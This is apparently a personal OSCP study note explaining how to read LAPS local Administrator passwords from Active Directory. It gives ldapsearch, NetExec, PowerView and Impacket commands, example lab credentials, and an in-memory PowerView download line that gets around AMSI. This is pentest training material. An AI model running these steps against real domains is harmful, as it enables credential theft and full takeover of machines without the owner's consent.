# LAPS — Read the Local Admin Password from AD (OSCP)

**What it is:** LAPS stores each domain-joined machine's **local Administrator
password** inside that computer's AD object, in the **`ms-Mcs-AdmPwd`** attribute
(newer "Windows LAPS" uses **`msLAPS-Password`**). It's stored in **cleartext** and
readable by whichever users/groups were **delegated** rights to it.

> **The attack = a read.** If your low-priv domain cred happens to have read access
> to `ms-Mcs-AdmPwd`, you just **read the local admin password** → log in as
> Administrator → SYSTEM. No exploit, no cracking. This is the *intended* path on
> boxes where a weak user was over-delegated.

---

## 1. Is LAPS even deployed? (check before hunting)

`ms-Mcs-AdmPwdExpirationTime` is usually **world-readable** even when the password
isn't — so a hit here proves LAPS is in use and worth targeting:
```bash
ldapsearch -x -H ldap://<IP> -D '<user>@<DOMAIN>' -w '<pass>' \
  -b "DC=<dc>,DC=<dc>" "(ms-MCS-AdmPwdExpirationTime=*)" ms-MCS-AdmPwdExpirationTime
```
Results back → LAPS deployed. Now try to read the real thing.

---

## 2. Read the password

**Easiest — NetExec module (auto-finds + prints what you can read):**
```bash
nxc ldap <IP> -u <user> -p <pass> -M laps
```

**ldapsearch — query the attribute directly (OSCP's shown method):**
```bash
ldapsearch -v -x -D <user>@<DOMAIN> -w '<pass>' -h <IP> \
  -b "DC=<dc>,DC=<dc>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

**Or dump everything to a file and grep (the "messy but works" way):**
```bash
ldapsearch -x -H ldap://<IP> -D '<user>@<DOMAIN>' -w '<pass>' \
  -b "DC=<dc>,DC=<dc>" > ldap.out
grep -i "AdmPwd" ldap.out
```
Nothing in the output = your user **isn't delegated** read rights (not a miss — you
just don't have access). A value = that's the local Administrator password.

> Concrete (Hutch): `ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h <IP> "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`

---

## 3. Use the password → SYSTEM

The recovered value is the **local `Administrator`** password. Log in with it:
```bash
psexec.py Administrator:'<LAPS-pass>'@<IP>      # → SYSTEM shell (see [[Impacket]])
evil-winrm -i <IP> -u Administrator -p '<LAPS-pass>'
```
Local admin on a DC = game over. Grab the flag.

---

## PowerView alternative (Windows-side)

`PowerView.ps1` reads the same attribute from *inside* a Windows foothold shell.

**On Kali it lives at:** `/usr/share/windows-resources/powersploit/Recon/PowerView.ps1`
**Steps:** serve it → transfer → **import (dot-source)** → run:
```bash
Get-DomainObject -Identity <PC-name> -Properties ms-Mcs-AdmPwd  # read the password
Find-LapsDelegatedGroups                                        # who is allowed to read LAPS
```
> The `. .\pv.ps1` dot-source is the easy-to-forget step — without it the `Get-Domain*`
> functions don't exist yet. (If AMSI blocks the import, load it in memory instead:
> `IEX(New-Object Net.WebClient).DownloadString('http://<KALI>/PowerView.ps1')`.)

Same result as ldapsearch, just run from a foothold shell instead of Kali. It also
maps **who** can read LAPS (ACL hunting) — useful when the direct read fails and you
need to find/become the delegated user first.

---

## Related Notes
- [[Impacket]] — psexec.py / wmiexec.py to use the recovered password
- [[LDAP]] — ldapsearch basics + base-DN syntax
- [[Active_Directory_Attacks]]
- [[RDP_and_WinRM]] — evil-winrm shell
